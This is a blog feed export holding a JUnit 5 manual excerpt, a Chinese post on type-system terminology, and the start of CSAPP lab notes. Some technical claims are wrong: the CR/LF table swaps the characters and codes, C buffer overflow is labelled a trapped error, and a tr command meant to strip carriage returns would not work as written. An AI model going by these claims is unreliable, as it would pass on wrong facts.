<span class="title">timeoutNotExceededWithMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// The following assertion invokes a method reference and returns an object.</span></span><br><span class="line">        String actualGreeting = assertTimeout(ofMinutes(<span class="number">2</span>), AssertionsDemo::greeting);</span><br><span class="line">        assertEquals(<span class="string">&quot;Hello, World!&quot;</span>, actualGreeting);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">timeoutExceeded</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// The following assertion fails with an error message similar to:</span></span><br><span class="line">        <span class="comment">// execution exceeded timeout of 10 ms by 91 ms</span></span><br><span class="line">        assertTimeout(ofMillis(<span class="number">10</span>), () -&gt; &#123;</span><br><span class="line">            <span class="comment">// Simulate task that takes more than 10 ms.</span></span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">timeoutExceededWithPreemptiveTermination</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// The following assertion fails with an error message similar to:</span></span><br><span class="line">        <span class="comment">// execution timed out after 10 ms</span></span><br><span class="line">        assertTimeoutPreemptively(ofMillis(<span class="number">10</span>), () -&gt; &#123;</span><br><span class="line">            <span class="comment">// Simulate task that takes more than 10 ms.</span></span><br><span class="line">            <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>).await();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">greeting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Assumptions"><a href="#Assumptions" class="headerlink" title="Assumptions"></a>Assumptions</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assertions.assertEquals;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assumptions.assumeTrue;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.jupiter.api.Assumptions.assumingThat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> example.util.Calculator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AssumptionsDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Calculator calculator = <span class="keyword">new</span> Calculator();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">testOnlyOnCiServer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        assumeTrue(<span class="string">&quot;CI&quot;</span>.equals(System.getenv(<span class="string">&quot;ENV&quot;</span>)));</span><br><span class="line">        <span class="comment">// remainder of test</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">testOnlyOnDeveloperWorkstation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        assumeTrue(<span class="string">&quot;DEV&quot;</span>.equals(System.getenv(<span class="string">&quot;ENV&quot;</span>)),</span><br><span class="line">            () -&gt; <span class="string">&quot;Aborting test: not on developer workstation&quot;</span>);</span><br><span class="line">        <span class="comment">// remainder of test</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">testInAllEnvironments</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        assumingThat(<span class="string">&quot;CI&quot;</span>.equals(System.getenv(<span class="string">&quot;ENV&quot;</span>)),</span><br><span class="line">            () -&gt; &#123;</span><br><span class="line">                <span class="comment">// perform these assertions only on the CI server</span></span><br><span class="line">                assertEquals(<span class="number">2</span>, calculator.divide(<span class="number">4</span>, <span class="number">2</span>));</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// perform these assertions in all environments</span></span><br><span class="line">        assertEquals(<span class="number">42</span>, calculator.multiply(<span class="number">6</span>, <span class="number">7</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Migrating-from-JUnit4"><a href="#Migrating-from-JUnit4" class="headerlink" title="Migrating from JUnit4"></a>Migrating from JUnit4</h2><ul><li>Annotations reside in the <code>org.junit.jupiter.api</code> package.</li><li>Assertions reside in <code>org.junit.jupiter.api.Assertions</code>.<ul><li>Note that you may continue to use assertion methods from <code>org.junit.Assert</code> or any other assertion library such as <a href="https://joel-costigliola.github.io/assertj/">AssertJ</a>, <a href="https://hamcrest.org/JavaHamcrest/">Hamcrest</a>, <a href="https://truth.dev/">Truth</a>, etc.</li></ul></li><li>Assumptions reside in <code>org.junit.jupiter.api.Assumptions</code>.<ul><li>Note that JUnit Jupiter 5.4 and later versions support methods from JUnit 4’s <code>org.junit.Assume</code> class for assumptions. Specifically, JUnit Jupiter supports JUnit 4’s <code>AssumptionViolatedException</code> to signal that a test should be aborted instead of marked as a failure.</li></ul></li><li><code>@Before</code> and <code>@After</code> no longer exist; use <code>@BeforeEach</code> and <code>@AfterEach</code> instead.</li><li><code>@BeforeClass</code> and <code>@AfterClass</code> no longer exist; use <code>@BeforeAll</code> and <code>@AfterAll</code> instead.</li><li><code>@Ignore</code> no longer exists: use <code>@Disabled</code> or one of the other built-in <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-conditional-execution">execution conditions</a> instead.</li><li><code>@Category</code> no longer exists; use <code>@Tag</code> instead.</li><li><code>@RunWith</code> no longer exists; superseded by <code>@ExtendWith</code>.</li><li><code>@Rule</code> and <code>@ClassRule</code> no longer exist; superseded by <code>@ExtendWith</code> and <code>@RegisterExtension</code></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/manual-of-JUnit/image-20210517194801837.png&quot; alt=&quot;image-20210517194801837&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://www.fvolcano.red/categories/Java/"/>
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>厘清概念：弱类型、强类型、动态类型、静态类型</title>
    <link href="https://www.fvolcano.red/2021/weak-strong-static-dynamic-langs/"/>
    <id>https://www.fvolcano.red/2021/weak-strong-static-dynamic-langs/</id>
    <published>2021-05-09T05:15:51.000Z</published>
    <updated>2021-05-09T05:15:51.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/weak-strong-static-dynamic-langs/b0aeb7ffd1667b9162e5329154d43777_r.jpg" alt="img"></p><a id="more"></a><h2 id="资料整理"><a href="#资料整理" class="headerlink" title="资料整理"></a>资料整理</h2><p><a href="https://www.zhihu.com/question/19918532">弱类型、强类型、动态类型、静态类型语言的区别是什么？</a></p><p><a href="https://segmentfault.com/a/1190000012372372">通俗的方式理解动态类型，静态类型；强类型，弱类型</a></p><p>正确性存疑，只是作为整理。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.zhihu.com/question/23434097">编程语言的类型系统为何如此重要？</a></li><li><a href="https://www.jianshu.com/p/336f19772046">编程语言傻傻分不清：弱类型、强类型、动态类型、静态类型</a></li></ol><h1 id="前置概念"><a href="#前置概念" class="headerlink" title="前置概念"></a>前置概念</h1><h3 id="Program-Errors"><a href="#Program-Errors" class="headerlink" title="Program Errors"></a>Program Errors</h3><ul><li><em>trapped errors</em>。导致程序终止执行，如除0，Java中数组越界访问</li><li><em>untrapped errors</em>。 出错后继续执行，但可能出现任意行为。如C里的缓冲区溢出、Jump到错误地址</li></ul><h3 id="Forbidden-Behaviours"><a href="#Forbidden-Behaviours" class="headerlink" title="Forbidden Behaviours"></a>Forbidden Behaviours</h3><p>语言设计时，可以定义一组<em>forbidden behaviors</em>. 它必须包括所有untrapped errors, 但可能包含trapped errors.</p><h3 id="well-behaved-amp-ill-behaved"><a href="#well-behaved-amp-ill-behaved" class="headerlink" title="well behaved &amp; ill behaved"></a>well behaved &amp; ill behaved</h3><p>如果程序执行不可能出现forbidden behaviors，则为well behaved，否则为ill behaved。</p><p><img src="/2021/weak-strong-static-dynamic-langs/1460000012372377" alt="img"></p><p>从图中可以看出，绿色的 program 表示所有程序（所有程序，你能想到和不能想到的），error 表示出错的程序，error 不仅仅包括 trapped error 和 untrapped error。</p><p>根据图我们可以严格的定义动态类型，静态类型；强类型，弱类型</p><ul><li>强类型：如果一门语言写出来的程序在红色矩形外部，则这门语言是强类型的，也就是上面说的 well behaved</li><li>弱类型：如果一门语言写出来的程序可能在红色矩形内部，则这门语言是弱类型的，也就是上面说的 ill behaved</li><li>静态类型：一门语言在<strong>编译</strong>时排除可能出现在红色矩形内的情况（通过语法报错），则这门语言是<strong>静态类型</strong>的</li><li>动态类型：一门语言在<strong>运行</strong>时排除可能出现在红色矩形内的情况（通过运行时报错，但如果是弱类型可能会触发 untrapped error，比如隐式转换，使得程序看起来似乎是正常运行的），则这门语言是<strong>动态类型</strong>的</li></ul><p>参考：《Type Systems》 Luca Cardelli - Microsoft Research</p><p><strong>Trapped error:</strong> An execution error that immediately results in a fault.</p><p><strong>Untrapped error:</strong> An execution error that does not immediately result in a fault.</p><p><strong>Forbidden error:</strong> The occurrence of one of a predetermined class of execution errors;</p><p>Typically the improper application of an operation to a value, such as not(3).</p><p><strong>Well behaved:</strong> A program fragment that will not produce forbidden errors at run time.</p><p><strong>Strongly checked language:</strong> A language where no forbidden errors can occur at run time (depending on the definition of forbidden error).</p><p><strong>Weakly checked language:</strong> A language that is statically checked but provides no clear guarantee of absence of execution errors.</p><p><strong>Statically checked language:</strong> A language where good behavior is determined before execution.</p><p><strong>Dynamically checked language:</strong> A language where good behavior is enforced during execution.</p><p><strong>Type safety:</strong> The property stating that programs do not cause untrapped errors.</p><p><strong>Explicitly typed language:</strong> A typed language where types are part of the syntax.</p><p><strong>Implicitly typed language:</strong> A typed language where types are not part of the syntax.</p><h1 id="强弱类型"><a href="#强弱类型" class="headerlink" title="强弱类型"></a>强弱类型</h1><ul><li><em>强类型strongly typed</em>: 如果一种语言的所有程序都是well behaved——即不可能出现forbidden behaviors，则该语言为strongly typed。</li><li><em>弱类型weakly typed</em>: 否则为weakly typed。比如C语言的缓冲区溢出，属于trapped errors，即属于forbidden behaviors..故C是弱类型</li></ul><p>弱类型语言，类型检查更不严格，如偏向于容忍隐式类型转换。譬如说C语言的int可以变成double。 这样的结果是：容易产生forbidden behaviours，所以是弱类型的。</p><p><strong>强类型定义语言（Explicit type conversion，强制数据类型定义语言，类型安全的语言）：</strong></p><p>一旦变量被指定某个数据类型，如果不经强制转换，即永远是此数据类型。</p><p>举例：若定义了一个整型变量a，若不进行显示转换，不能将a当作字符串类型处理<br>强类型语言是指需要进行变量/对象类型声明的语言，一般情况下需要编译执行。例如C/C++/Java/C#</p><p><strong>弱类型定义语言（Implicit type conversion，类型不安全的语言）：</strong></p><p>数据类型可以被忽略的语言。它与强类型定义语言相反, 一个变量可以赋不同数据类型的值。</p><p>举例：在VBScript中，可以将字符串 ‘12’ 和整数 3 进行连接得到字符串 ‘123’， 然后可以把它看成整数 123，而不需要显示转换<br>例如PHP/ASP/Ruby/Python/Perl/ABAP/SQL/JavaScript/Unix Shell等</p><p>注意：强类型定义语言在速度上可能略逊色于弱类型定义语言，但是强类型定义语言带来的严谨性能够有效的避免许多错误。</p><h1 id="动静态类型"><a href="#动静态类型" class="headerlink" title="动静态类型"></a>动静态类型</h1><p>静态类型、动态类型其实是指Type Check发生的时机。</p><ul><li><em>静态类型 statically</em>: 如果在编译时拒绝ill behaved程序，则是statically typed;</li><li><em>动态类型dynamiclly</em>: 如果在运行时拒绝ill behaviors, 则是dynamiclly typed。</li></ul><p>只通过是否将类型名显式地写出来，如int a; 并不能判断动静态类型。如Ocaml是静态隐式类型。</p><p>静态类型可以分为两种：</p><ul><li>如果类型是语言语法的一部分，在是<strong>explicitly typed显式类型；</strong></li><li>如果类型通过编译时推导，是<strong>implicity typed隐式类型</strong></li></ul><p><img src="/2021/weak-strong-static-dynamic-langs/ee19ac87e0b6adc9812c2e2cf77e7dc3_r.jpg" alt="img"></p><p><strong>动态类型语言（Dynamically Typed Language）：</strong></p><p>运行期间才做数据类型检查的语言，即动态类型语言编程时，永远不用给任何变量指定数据类型。该语言会在第一次赋值给变量时，在内部将数据类型记录下来。<br>例如：ECMAScript(JavaScript)、Ruby、Python、VBScript、php<br>Python和Ruby就是典型动态类型语言，其他各种脚本语言如VBScript也多少属于动态类型语言<br>优点：方便阅读，不需要写非常多的类型相关的代码；<br>缺点：不方便调试，命名不规范时会造成读不懂，不利于理解等</p><p><strong>静态类型语言（Statically Typed Language）：</strong></p><p>编译期间做检查数据类型的语言，即写程序时要声明所有变量的数据类型，是固定的。使用数据之前，必须先声明数据类型（int ,float,double等）。相当于使用之前，首先要为它们分配好内存空间。<br>例如：C/C++是静态类型语言的典型代表，其他的静态类型语言还有C#、JAVA等<br>优点：结构非常规范，便于调试，方便类型安全<br>缺点：为此需要写更多类型相关代码，不便于阅读、不清晰明了</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>弱类型：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="string">&quot;1&quot;</span>+<span class="number">2</span></span><br><span class="line"><span class="string">&#x27;12&#x27;</span></span><br></pre></td></tr></table></figure><p>强类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;1&quot;</span>+<span class="number">2</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: cannot concatenate <span class="string">&#x27;str&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;int&#x27;</span> objects</span><br></pre></td></tr></table></figure><p>动态类型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(a)</span><br><span class="line">&lt;type <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&quot;s&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(a)</span><br><span class="line">&lt;type <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>静态类型：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Prelude</span>&gt; <span class="keyword">let</span> a = <span class="string">&quot;123&quot;</span> :: <span class="type">Int</span></span><br><span class="line"></span><br><span class="line">&lt;interactive&gt;:<span class="number">2</span>:<span class="number">9</span>:</span><br><span class="line">    <span class="type">Couldn&#x27;t</span> match expected <span class="class"><span class="keyword">type</span> `<span class="type">Int&#x27;</span> with actual <span class="keyword">type</span> `[<span class="type">Char</span>]&#x27;</span></span><br><span class="line">    <span class="type">In</span> the expression: <span class="string">&quot;123&quot;</span> :: <span class="type">Int</span></span><br><span class="line">    <span class="type">In</span> an equation for `a&#x27;: a = <span class="string">&quot;123&quot;</span> :: <span class="type">Int</span></span><br></pre></td></tr></table></figure><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p><img src="/2021/weak-strong-static-dynamic-langs/1283539-31968e5f19abed4b.jpg" alt="img"></p><p>定义了一个某一个类型的数据，通常意味着以下三件事：</p><p>1，定义了一块某种结构的存储空间，用来存储这个数据；</p><p>2，特定类型意味可以对这块存储空间进行一些特定的操作；</p><p>3，声明了一个标识符（不严密的说就是变量名），作为操作这块数据的“标签”，之后可以通过这个标签操作这块数据，否则这块数据是无法使用的。</p><p>无论编译型语言还是解释型语言，这三点是共性。</p><p>若从程序出错的角度来解释这个问题，和类型有关的错误有：</p><p>1，访问了一个特定类型的标识符，但是访问的不是预期的存储空间。</p><p>2，对特定类型的标识符对应的数据，进行了非预期的操作。</p><p>为了防止与类型有关的错误发生，编程语言可以进行类型检查。</p><p>1、<strong>强类型检查</strong>与<strong>弱类型检查</strong>；</p><p>程序错误，大体上可分为可捕获错误<em>trapped errors</em> 和不可捕获错误<em>untrapped errors。</em> 可捕获错误<em>trapped errors</em> 发生时，程序停了下来，用户明确知道发生了错误；而不可捕获错误<em>untrapped errors</em>发生时，用户不知道错误的发生，程序的结果是否正确也无法判断，有可能造成重大损失。所以类型检查的目标，是：“捕获与类型有关的错误”。</p><p>所以，能保证不存在与类型有关的不可捕获错误的编程语言，可以称之为 具有<strong>强类型检查</strong>；反之称为 <strong>弱类型检查</strong>。</p><p>2、<strong>动态类型检查</strong>与<strong>静态类型检查</strong>；</p><p>普遍说法是<strong>静态类型检查</strong>是指在编译阶段进行的类型检查，动态类型检查是在执行阶段进行的类型检查。那么严格来说，解释性语言，并没有编译阶段。（虽然为了效率通常会转义成中间代码，这其中存在一些灰色地带，但是这个转义的过程，最基本的要求是对用户透明。）所以按”编译阶段”的说法，对于解释型语言，并不存在<strong>静态类型检查</strong>的概念。但是，许多解释型语言，现在往往可以通过外置的lint工具对脚本进行检查，这也是一种静态检查，但是已经不是语言本身的特性了。</p><p>对于编译型语言来说，可以在编译阶段进行<strong>静态类型检查</strong>，而且因为运行时库的存在，也可以在运行时进行<strong>动态类型检查。</strong></p><p>3、标识符<strong>动态类型绑定</strong>与<strong>静态类型绑定</strong>；</p><p>特定类型数据需要一个标识符（不严密的说就是变量名）与其绑定。这里面涉及的概念比较复杂：</p><ul><li><p>标识符与特定类型的数据绑定后，不允许解绑，那怕是解绑后重新绑定到同样类型的数据。</p></li><li><p>标识符与特定类型的数据绑定后，允许解绑，但是解绑后只允许重新绑定到同样类型的数据。</p></li><li><p>标识符与特定类型的数据绑定后，允许解绑，解绑后允许绑定到任意类型的数据。</p></li></ul><p>4、对于编译型语言，上述绑定，理论上可以发生在编译阶段，也可以发生在执行阶段。在执行阶段，变量名往往并不存在，存在的只是指针，这也是一种隐含的动态绑定，意味这一个指针指向了一个新的类型的数据空间，这有极大的便利性灵活性，也有极大的危险性。C语言看似非常“静态”，其实动态的一塌糊涂。</p><p>上述情况中的3，是通常意义上所说的动态类型绑定。动态类型绑定的主要问题是，同一个标识符的多次绑定，容易混淆本来的意义。动态绑定的表示符，往往通过推到来确定类型，这也会造成程序的可读性很差。</p><p>所以，为了搞清楚“弱类型、强类型、动态类型、静态类型”这四个提法，关键要这个提法就容易让人迷惑，不如搞清楚这三对概念：</p><p><strong>弱类型检查</strong> 与 <strong>强类型检擦</strong></p><p><strong>动态类型检查</strong> 与 <strong>静态类型检查</strong></p><p>标识符的 <strong>静态类型绑定</strong> 与 <strong>动态类型绑定</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/weak-strong-static-dynamic-langs/b0aeb7ffd1667b9162e5329154d43777_r.jpg&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://www.fvolcano.red/categories/Java/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>计算机系统实验记录</title>
    <link href="https://www.fvolcano.red/2021/computer-architecture-hitlabs/"/>
    <id>https://www.fvolcano.red/2021/computer-architecture-hitlabs/</id>
    <published>2021-04-06T14:12:07.000Z</published>
    <updated>2021-04-06T14:12:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>CSAPP经典实验个人解答，共八个。<a id="more"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_45406155">dream or nightmare博客</a></p><h1 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h1><ol><li>linux与windows下回车编码对比。</li></ol><ul><li><a href="https://www.jianshu.com/p/fd7822e69fea">Windows和Linux 行尾符(EndOfLine)的区别</a></li></ul><p>windows下默认编码 ANSI，linux默认utf-8。</p><h3 id="各系统关于行尾符（End-of-Line）的规定"><a href="#各系统关于行尾符（End-of-Line）的规定" class="headerlink" title="各系统关于行尾符（End-of-Line）的规定"></a>各系统关于行尾符（End-of-Line）的规定</h3><p>Unix每行结尾为”\n”</p><p>Windows系统每行结尾是“\r\n”</p><p>Mac OS在 OS X以前每行结尾是”\r”， 现在每行结尾是 “\n”</p><table><thead><tr><th>中文名</th><th>英文名</th><th>英文缩写</th><th>英文解释</th><th>C语言中表示</th><th>ASCII码</th></tr></thead><tbody><tr><td>回车</td><td>carriage return</td><td>CR</td><td>return</td><td>\n</td><td>0x0A (10)</td></tr><tr><td>换行</td><td>line feed</td><td>LF</td><td>new line</td><td>\r</td><td>0x0D (14)</td></tr></tbody></table><blockquote><p>在计算机还没有出现之前，有一种叫做电传打字机（Teletype Model 33）的玩意，每秒钟可以打10个字符。但是它有一个问题，就是打完一行换行的时候，要用去0.2秒，正好可以打两个字符。要是在这0.2秒里面，又有新的字符传过来，那么这个字符将丢失。于是，研制人员想了个办法解决这个问题，就是在每行后面加两个表示结束的字符。一个叫做“回车”，告诉打字机把打印头定位在左边界；另一个叫做“换行”，告诉打字机把纸向下移一行。这就是“换行”和“回车”的来历，从它们的英语名字上也可以看出一二。后来，计算机发明了，这两个概念也就被般到了计算机上。那时，存储器很贵，一些科学家认为在每行结尾加两个字符太浪费了，加一个就可以。于是，就出现了分歧。</p></blockquote><p>结果是：Unix/Mac系统下的文件在Windows里打开的话，所有文字会变成一行；Windows里的文件在Unix/Mac下打开的话，在每行的结尾可能会多出一个^M符号。</p><p>在Windows系统中，文本文件以” \r\n”代表换行。用fputs等函数写换行符’\n’时，Windows会将’\n’隐式转换为”\r\n”，然后再写入到文件中。用fgets等函数读换行符’\n’的时候，Windows会将文件中的”\r\n”隐式转换为’\n’，然后再读到变量中。</p><ul><li>可以用linux命令实现转换：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> unix2dos filename</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> dos2unix filename</span></span><br></pre></td></tr></table></figure><ul><li><p>一般在程序中, 写\n就可以了, 它在linux或windows中都能实现回车+换行的功能(只是在文本文件中, linux只会有0x0a, windows会自动换为0x0d 0x0a)。</p></li><li><p>在linux下使用%c会读到\n和\r两个字符。所以需要将^M（也就是\r）字符删掉。</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat a.txt | tr -d <span class="string">&quot;^M&quot;</span> &gt; b.txt</span></span><br></pre></td></tr></table></figure><ol start="2"><li>解释现象。</li></ol><p><img src="/2021/computer-architecture-hitlabs/1.png"></p><p><img src="/2021/computer-architecture-hitlabs/2.png"></p><p>原因：</p><p>第一组数据：输入和输出不一致是因为单精度浮点数在IEEE规定下的表示造成的。第一组数据在二进制数表示下为无循环的小数，由于float数据类型只能存储23位小数，为数后面的数都会被截断而且会向偶数进行舍入，因此有的数据进行舍入时会改变运行结果，所以第一组数据存在一些数据发生结果改变.</p><p>第二组数据：由第一组数据中的分析可知，第二组数据在进行偶数舍入的情况下并没有发生结果的改变，因此运行结果和数据输入的内容相同相同。</p><p>使用浮点数应注意：float单精度浮点数在计算机存储大多是近似值，无法精确表示准确数值。因此最好不要对float单精度浮点数进行比较的运算。如果想要更高精度的数据表示可以选择使用double双精度浮点数的类型或者用数组按位表示。</p><ol start="3"><li>查看各数值的内存中十六进制存储。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *byte_pointer;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(byte_pointer start, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">true<span class="keyword">size_t</span> i;</span><br><span class="line">true<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">truetrue<span class="built_in">printf</span>(<span class="string">&quot;%.2x&quot;</span>, start[i]);</span><br><span class="line">true&#125;</span><br><span class="line">true<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">true<span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">trueshow_bytes((byte_pointer)&amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ol><li><p>学会如何使用linux的命令行，使用一些简单的命令代替图形界面操作。</p></li><li><p>学会在命令行完整写出一个c程序，用vim编辑，gcc编译。</p></li><li><p>了解在windows和linux平台下如何配置C编译环境。</p></li><li><p>复习了C相关知识点，编写了几个简单程序。</p></li><li><p>了解了windows 和 linux 的硬件信息。</p></li></ol><h1 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h1><h2 id="debug-with-gdb-amp-objdump"><a href="#debug-with-gdb-amp-objdump" class="headerlink" title="debug with gdb &amp; objdump"></a>debug with gdb &amp; objdump</h2><ol><li><p><a href="https://www.howtoforge.com/linux-objdump-command/">Linux objdump Command Explained for Beginners (7 Examples)</a></p></li><li><p><a href="https://www.howtoforge.com/tutorial/how-to-debug-c-programs-in-linux-using-gdb/">How to debug C programs in Linux using gdb</a></p></li><li><p><a href="https://linux.die.net/man/1/gcc">gcc man page</a></p></li><li><p><a href="https://developer.ibm.com/technologies/linux/articles/l-gdb/">Linux software debugging with GDB</a></p></li><li><p><a href="https://www.bytesnap.com/how-to-debug-your-linux-application-debugging-by-printf/#">How to debug your Linux Application: Debugging by printf</a></p></li><li><p><a href="http://www.brendangregg.com/blog/2016-08-09/gdb-example-ncurses.html">gdb Debugging Full Example (Tutorial): ncurses</a></p></li><li><p><a href="https://www.youtube.com/watch?v=-n9Fkq1e6sg&list=PLHTh1InhhwT7J5jl4vAhO1WvGHUUFgUQH&index=41&ab_channel=CppCon">CppCon 2016: Greg Law “GDB - A Lot More Than You Knew”</a></p></li></ol><h2 id="不同类型值存储位置"><a href="#不同类型值存储位置" class="headerlink" title="不同类型值存储位置"></a>不同类型值存储位置</h2><p><a 